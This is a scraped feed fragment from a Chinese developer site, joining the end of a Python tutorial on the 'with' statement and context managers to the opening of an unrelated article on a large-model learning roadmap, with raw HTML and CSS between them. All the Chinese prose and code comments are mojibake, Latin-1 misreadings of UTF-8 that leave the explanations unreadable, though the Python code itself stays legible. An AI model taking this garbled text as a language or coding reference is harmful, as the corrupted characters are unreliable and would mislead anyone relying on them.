        <span class="hljs-comment"># æ–‡ä»¶æ²¡å…³é—­ï¼èµ„æºæ³„æ¼ï¼</span>
</code></pre>
<p><strong>ç»“æœï¼š</strong> å¼‚å¸¸å¤„ç†äº†ï¼Œä½†èµ„æºæ²¡é‡Šæ”¾ã€‚</p>
<h3 data-id="heading-4">âŒ è€æ‰‹å†™æ³•ï¼ˆç»ˆäºçŸ¥é“è¦closeäº†ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>():
    <span class="hljs-keyword">try</span>:
        file = <span class="hljs-built_in">open</span>(<span class="hljs-string">'important.txt'</span>, <span class="hljs-string">'w'</span>)
        file.write(<span class="hljs-string">'å…³é”®æ•°æ®'</span>)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'å‡ºé”™äº†: <span class="hljs-subst">{e}</span>'</span>)
    <span class="hljs-keyword">finally</span>:
        file.close()  <span class="hljs-comment"># ä½†æ˜¯å¦‚æœopenå°±å¤±è´¥äº†æ€ä¹ˆåŠï¼Ÿ</span>
</code></pre>
<p><strong>ç»“æœï¼š</strong> å¦‚æœ<code>open('important.txt')</code>æœ¬èº«å°±å¤±è´¥ï¼Œ<code>file.close()</code>ä¼šæŠ¥é”™<code>NameError</code>ï¼</p>
<h2 data-id="heading-5">withè¯­å¥çš„æ­£ç¡®å§¿åŠ¿</h2>
<h3 data-id="heading-6">âœ… å¤§ç¥å†™æ³•ï¼ˆä¼˜é›…ã€å®‰å…¨ã€ç®€æ´ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>():
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'important.txt'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> file:
        file.write(<span class="hljs-string">'å…³é”®æ•°æ®'</span>)
        <span class="hljs-number">1</span> / <span class="hljs-number">0</span>  <span class="hljs-comment"># å°±ç®—è¿™é‡Œå´©äº†ï¼Œæ–‡ä»¶ä¹Ÿä¼šè‡ªåŠ¨å…³é—­</span>
</code></pre>
<p>å°±è¿™ä¹ˆç®€å•ï¼ä¸ç®¡ä¸­é—´å‘ç”Ÿä»€ä¹ˆï¼Œæ–‡ä»¶éƒ½ä¼šè¢«æ­£ç¡®å…³é—­ã€‚</p>
<p><strong>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆPythonå¤§ç¥éƒ½åœ¨ç”¨withçš„åŸå› â€”â€”å®ƒèƒ½è®©ä½ ç¡ä¸ªå®‰ç¨³è§‰ã€‚</strong></p>
<h2 data-id="heading-7">withçš„å·¥ä½œåŸç†</h2>
<p>withè¯­å¥èƒŒåæ˜¯ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼š<code>__enter__</code>å’Œ<code>__exit__</code>ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FileManager</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, filename, mode</span>):
        self.filename = filename
        self.mode = mode
        self.file = <span class="hljs-literal">None</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__enter__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‡†å¤‡æ‰“å¼€æ–‡ä»¶...'</span>)
        self.file = <span class="hljs-built_in">open</span>(self.filename, self.mode)
        <span class="hljs-keyword">return</span> self.file  <span class="hljs-comment"># è¿™ä¸ªè¿”å›å€¼ä¼šèµ‹ç»™asåé¢çš„å˜é‡</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__exit__</span>(<span class="hljs-params">self, exc_type, exc_val, exc_tb</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'å‡†å¤‡å…³é—­æ–‡ä»¶...'</span>)
        <span class="hljs-keyword">if</span> self.file:
            self.file.close()

        <span class="hljs-comment"># å¦‚æœè¿”å›Trueï¼Œå¼‚å¸¸ä¼šè¢«å¿½ç•¥</span>
        <span class="hljs-comment"># å¦‚æœè¿”å›Falseæˆ–Noneï¼Œå¼‚å¸¸ä¼šç»§ç»­ä¼ æ’­</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-comment"># ä½¿ç”¨æ–¹å¼</span>
<span class="hljs-keyword">with</span> FileManager(<span class="hljs-string">'test.txt'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
    f.write(<span class="hljs-string">'Hello World'</span>)
    <span class="hljs-comment"># è¿™é‡Œå°±ç®—æŠ›å¼‚å¸¸ï¼Œ__exit__ä¹Ÿä¼šè¢«è°ƒç”¨</span>
</code></pre>
<p><strong>ä½ å¯ä»¥æŠŠwithæƒ³è±¡æˆä¸€ä¸ªè¶…çº§é è°±çš„ç®¡å®¶ï¼š</strong></p>
<ol>
<li>ä½ è¦è¿›é—¨å‰ï¼Œç®¡å®¶æå‰å¸®ä½ å¼€é—¨ï¼ˆ<code>__enter__</code>ï¼‰</li>
<li>ä½ åœ¨å±‹é‡Œéšä¾¿æŠ˜è…¾ï¼Œç®¡å®¶åœ¨é—¨å£ç­‰ç€</li>
<li>ä½ è¦å‡ºé—¨æ—¶ï¼Œç®¡å®¶å¸®ä½ å…³é—¨ï¼ˆ<code>__exit__</code>ï¼‰</li>
<li>å°±ç®—ä½ åœ¨å±‹é‡Œæ‘”å€’äº†ï¼Œç®¡å®¶ä¹Ÿä¼šå…ˆæ‰¶ä½ èµ·æ¥ï¼Œå†å¸®ä½ å…³é—¨</li>
</ol>
<h2 data-id="heading-8">å®æˆ˜åœºæ™¯ï¼šä»€ä¹ˆæ—¶å€™ç”¨withï¼Ÿ</h2>
<h3 data-id="heading-9">1. æ–‡ä»¶æ“ä½œï¼ˆæœ€å¸¸è§ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è¯»å–å¤§æ–‡ä»¶ï¼Œä¸ç”¨æ‹…å¿ƒå¿˜è®°å…³é—­</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'big_data.csv'</span>, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:
        process_line(line)  <span class="hljs-comment"># å°±ç®—è¿™é‡Œå†…å­˜æº¢å‡ºï¼Œæ–‡ä»¶ä¹Ÿä¼šå…³é—­</span>
</code></pre>
<h3 data-id="heading-10">2. æ•°æ®åº“è¿æ¥</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sqlite3

<span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user_money</span>(<span class="hljs-params">user_id, amount</span>):
    <span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">'app.db'</span>) <span class="hljs-keyword">as</span> conn:
        cursor = conn.cursor()
        cursor.execute(<span class="hljs-string">'UPDATE users SET money = money + ? WHERE id = ?'</span>,
                      (amount, user_id))
        <span class="hljs-comment"># è‡ªåŠ¨æäº¤å’Œå…³é—­ï¼Œå°±ç®—è¿™é‡ŒæŠ›å¼‚å¸¸ä¹Ÿä¸ä¼šé”æ­»æ•°æ®åº“</span>
</code></pre>
<h3 data-id="heading-11">3. çº¿ç¨‹é”</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> threading

lock = threading.Lock()

<span class="hljs-keyword">def</span> <span class="hljs-title function_">critical_section</span>():
    <span class="hljs-keyword">with</span> lock:
        <span class="hljs-comment"># ä¸´ç•ŒåŒºä»£ç ï¼ŒåŒæ—¶åªèƒ½ä¸€ä¸ªçº¿ç¨‹è®¿é—®</span>
        shared_resource += <span class="hljs-number">1</span>
        <span class="hljs-comment"># å°±ç®—è¿™é‡ŒæŠ›å¼‚å¸¸ï¼Œé”ä¹Ÿä¼šè¢«é‡Šæ”¾ï¼Œä¸ä¼šæ­»é”</span>
</code></pre>
<h3 data-id="heading-12">4. ç½‘ç»œè¯·æ±‚</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

<span class="hljs-keyword">def</span> <span class="hljs-title function_">download_data</span>():
    <span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:
        session.auth = (<span class="hljs-string">'user'</span>, <span class="hljs-string">'pass'</span>)
        response = session.get(<span class="hljs-string">'https://api.example.com/data'</span>)
        <span class="hljs-comment"># è¿æ¥æ± è‡ªåŠ¨ç®¡ç†ï¼Œä¸ç”¨æ‹…å¿ƒèµ„æºæ³„æ¼</span>
</code></pre>
<h2 data-id="heading-13">è‡ªå®šä¹‰ä¸Šä¸‹æ–‡ç®¡ç†å™¨</h2>
<p>æœ‰æ—¶å€™ä½ æƒ³åˆ›å»ºè‡ªå·±çš„"è‡ªåŠ¨ç®¡å®¶"ï¼Œå¾ˆç®€å•ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">timer</span>(<span class="hljs-params">name</span>):
    <span class="hljs-keyword">import</span> time
    start = time.time()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f'<span class="hljs-subst">{name}</span> å¼€å§‹æ‰§è¡Œ...'</span>)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span>  <span class="hljs-comment"># è¿™é‡Œæ˜¯withå—ä¸­çš„ä»£ç </span>
    <span class="hljs-keyword">finally</span>:
        end = time.time()
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f'<span class="hljs-subst">{name}</span> æ‰§è¡Œå®Œæ¯•ï¼Œè€—æ—¶ï¼š<span class="hljs-subst">{end - start:<span class="hljs-number">.2</span>f}</span>ç§’'</span>)

<span class="hljs-comment"># ä½¿ç”¨æ–¹å¼</span>
<span class="hljs-keyword">with</span> timer(<span class="hljs-string">'æ•°æ®å¤„ç†'</span>):
    time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-comment"># æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ</span>
    <span class="hljs-comment"># è¿™é‡Œä¼šè‡ªåŠ¨è®¡ç®—å¹¶æ‰“å°æ‰§è¡Œæ—¶é—´</span>
</code></pre>
<h2 data-id="heading-14">è¸©å‘æŒ‡å—</h2>
<h3 data-id="heading-15">1. __exit__çš„è¿”å›å€¼é™·é˜±</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BadContext</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__enter__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'è¿›å…¥'</span>)
        <span class="hljs-keyword">return</span> self

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__exit__</span>(<span class="hljs-params">self, exc_type, exc_val, exc_tb</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'é€€å‡º'</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># è¿™è¡Œæ˜¯é™·é˜±ï¼</span>

<span class="hljs-keyword">with</span> BadContext():
    <span class="hljs-number">1</span> / <span class="hljs-number">0</span>  <span class="hljs-comment"># è¿™ä¸ªå¼‚å¸¸ä¼šè¢«"åƒæ‰"ï¼</span>

<span class="hljs-built_in">print</span>(<span class="hljs-string">'ç¨‹åºç»§ç»­è¿è¡Œï¼Œä½ éƒ½ä¸çŸ¥é“å‡ºè¿‡å¼‚å¸¸ï¼'</span>)
</code></pre>
<p><strong>åˆ‡è®°ï¼š</strong> é™¤éä½ çœŸçš„çŸ¥é“è‡ªå·±åœ¨åšä»€ä¹ˆï¼Œå¦åˆ™<code>__exit__</code>åº”è¯¥è¿”å›<code>False</code>æˆ–<code>None</code>ã€‚</p>
<h3 data-id="heading-16">2. å¼‚å¸¸ä¿¡æ¯ä¸¢å¤±</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug_context</span>():
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">with</span> some_context():
            risky_operation()
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-comment"># è¿™é‡Œçš„eå¯èƒ½æ˜¯ä¸Šä¸‹æ–‡ç®¡ç†å™¨æŠ›å‡ºçš„å¼‚å¸¸</span>
        <span class="hljs-comment"># è€Œä¸æ˜¯ä½ çœŸæ­£æƒ³æ•è·çš„å¼‚å¸¸</span>
        logger.error(<span class="hljs-string">f'å‡ºé”™äº†: <span class="hljs-subst">{e}</span>'</span>)
</code></pre>
<h3 data-id="heading-17">3. åµŒå¥—withçš„æ€§èƒ½</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ è¿™æ ·å†™æ€§èƒ½ä¸å¥½</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'file1.txt'</span>) <span class="hljs-keyword">as</span> f1:
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'file2.txt'</span>) <span class="hljs-keyword">as</span> f2:
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'file3.txt'</span>) <span class="hljs-keyword">as</span> f3:
            process_files(f1, f2, f3)

<span class="hljs-comment"># âœ… æ¨èå†™æ³•</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'file1.txt'</span>) <span class="hljs-keyword">as</span> f1, \
     <span class="hljs-built_in">open</span>(<span class="hljs-string">'file2.txt'</span>) <span class="hljs-keyword">as</span> f2, \
     <span class="hljs-built_in">open</span>(<span class="hljs-string">'file3.txt'</span>) <span class="hljs-keyword">as</span> f3:
    process_files(f1, f2, f3)
</code></pre>
<h2 data-id="heading-18">è¿›é˜¶æŠ€å·§</h2>
<h3 data-id="heading-19">1. ä½¿ç”¨contextlib.suppress</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> suppress

<span class="hljs-comment"># æœ‰æ—¶å€™ä½ å°±æ˜¯æƒ³å¿½ç•¥æŸäº›å¼‚å¸¸</span>
<span class="hljs-keyword">with</span> suppress(FileNotFoundError):
    os.remove(<span class="hljs-string">'temp_file.txt'</span>)  <span class="hljs-comment"># æ–‡ä»¶ä¸å­˜åœ¨ä¹Ÿæ²¡å…³ç³»</span>
</code></pre>
<h3 data-id="heading-20">2. ä½¿ç”¨contextlib.nullcontext</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> nullcontext

<span class="hljs-comment"># æœ‰æ—¶å€™ä½ æ¡ä»¶æ€§åœ°éœ€è¦ä¸Šä¸‹æ–‡ç®¡ç†å™¨</span>
context_manager = lock <span class="hljs-keyword">if</span> use_lock <span class="hljs-keyword">else</span> nullcontext()

<span class="hljs-keyword">with</span> context_manager:
    shared_operation()
</code></pre>
<h2 data-id="heading-21">æ€»ç»“</h2>
<p>è®°ä½ä¸€å¥è¯ï¼š<strong>æ¶‰åŠèµ„æºçš„è·å–å’Œé‡Šæ”¾ï¼Œå°±è€ƒè™‘ç”¨withè¯­å¥ã€‚</strong></p>
<ul>
<li>æ–‡ä»¶æ“ä½œï¼Ÿç”¨with</li>
<li>æ•°æ®åº“è¿æ¥ï¼Ÿç”¨with</li>
<li>ç½‘ç»œè¯·æ±‚ï¼Ÿç”¨with</li>
<li>çº¿ç¨‹é”ï¼Ÿç”¨with</li>
<li>ä¸´æ—¶ç›®å½•ï¼Ÿç”¨with</li>
</ul>
<p><strong>withä¸æ˜¯è¯­æ³•ç³–ï¼Œæ˜¯ä½ çš„ä¿é™©å•ã€‚</strong></p>
<p>ä¸‹æ¬¡å†çœ‹åˆ°<code>open()</code>åé¢æ²¡æœ‰<code>with</code>ï¼Œä½ å°±çŸ¥é“è¯¥è¯´ä»€ä¹ˆäº†ï¼š</p>
<p>"å…„å¼Ÿï¼Œä½ è¿™ä»£ç èƒ½è·‘ï¼Œä½†æ˜¯æˆ‘å»ºè®®ä½ ä¹°ä¸ªä¿é™©..."</p>
<hr/>
<p><strong>ä½ åœ¨é¡¹ç›®é‡Œé‡åˆ°è¿‡å“ªäº›èµ„æºæ³„æ¼çš„å‘ï¼Ÿè¯„è®ºåŒºèŠèŠï¼Œçœ‹çœ‹è°çš„æ•…äº‹æ›´æƒ¨ï¼</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025æœ€æ–°å¤§æ¨¡å‹æŠ€æœ¯å­¦ä¹ è·¯çº¿ï¼šä»å…¥é—¨åˆ°ç²¾é€šï¼Œä¸€ç¯‡æ–‡ç« å…¨æŒæ¡]]></title>    <link>https://juejin.cn/post/7580623265792688166</link>    <guid>https://juejin.cn/post/7580623265792688166</guid>    <pubDate>2025-12-08T03:07:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580623265792688166" data-draft-id="7580745065170518067" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025æœ€æ–°å¤§æ¨¡å‹æŠ€æœ¯å­¦ä¹ è·¯çº¿ï¼šä»å…¥é—¨åˆ°ç²¾é€šï¼Œä¸€ç¯‡æ–‡ç« å…¨æŒæ¡"/> <meta itemprop="keywords" content="LLM,Agent,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-08T03:07:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AIå¤§æ¨¡å‹"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025æœ€æ–°å¤§æ¨¡å‹æŠ€æœ¯å­¦ä¹ è·¯çº¿ï¼šä»å…¥é—¨åˆ°ç²¾é€šï¼Œä¸€ç¯‡æ–‡ç« å…¨æŒæ¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AIå¤§æ¨¡å‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:07:15.000Z" title="Mon Dec 08 2025 03:07:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote>
<p>å¤§æ¨¡å‹æŠ€æœ¯çš„åŸºç¡€å­¦ä¹ ï¼Œæ˜¯æœªæ¥åœ¨å¤§æ¨¡å‹é¢†åŸŸèƒ½å¦ç«™ç¨³è„šè·Ÿçš„å…³é”®</p>
<p>éšç€å¤§æ¨¡å‹æŠ€æœ¯çš„å‘å±•ï¼Œè¶Šæ¥è¶Šå¤šçš„äººå¼€å§‹è¿›å…¥å¤§æ¨¡å‹é¢†åŸŸï¼Œä½†å¤§æ¨¡å‹ä½œä¸ºä¸€é—¨æŠ€æœ¯ï¼Œå› æ­¤å®ƒçš„æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå·¥å…·ï¼Œå› æ­¤è¿™ä¹Ÿè®©å­¦ä¹ å¤§æ¨¡å‹æœ‰äº†ä¸åŒçš„å­¦ä¹ æ–¹å‘ã€‚</p>
<p>ä»å·¥å…·çš„è§’åº¦æ¥çœ‹ï¼Œå­¦ä¹ ä¸€ä¸ªå·¥å…·ä¸»è¦æœ‰ä¸¤ä¸ªæ–¹å‘ï¼Œä¸€ä¸ªæ˜¯ä½¿ç”¨å·¥å…·ï¼Œä¸€ä¸ªæ˜¯åˆ¶é€ å·¥å…·ï¼›è€Œä»Šå¤©æˆ‘ä»¬ä¸»è¦è®²çš„æ˜¯åè€…ï¼Œä¹Ÿå°±æ˜¯æ€ä¹ˆåˆ¶é€ ä¸€ä¸ªå¤§æ¨¡å‹å·¥å…·ï¼Œå®ƒéœ€è¦å“ªäº›æŠ€æœ¯åŸºç¡€ã€‚â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<h2 data-id="heading-0">ä¸€ã€å¤§æ¨¡å‹åŸºç¡€æŠ€æœ¯è·¯çº¿â€â€â€</h2>
<p>ä¸‹é¢ä¸»è¦ä»ä»¥ä¸‹å‡ ä¸ªæŠ€æœ¯åŸºç¡€è®²è§£ä¸€ä¸‹å¤§æ¨¡å‹çš„å­¦ä¹ è·¯çº¿ï¼šâ€â€â€â€â€â€â€</p>
<ul>
<li>ç†è®ºåŸºç¡€â€</li>
<li>ç¼–ç¨‹åŸºç¡€</li>
<li>æ·±åº¦å­¦ä¹ æ¡†æ¶</li>
<li>ç‰¹å®šé¢†åŸŸçŸ¥è¯†â€â€â€â€</li>
<li>å®è·µç»éªŒ</li>
<li>ç®—æ³•åŸºç¡€</li>
</ul>
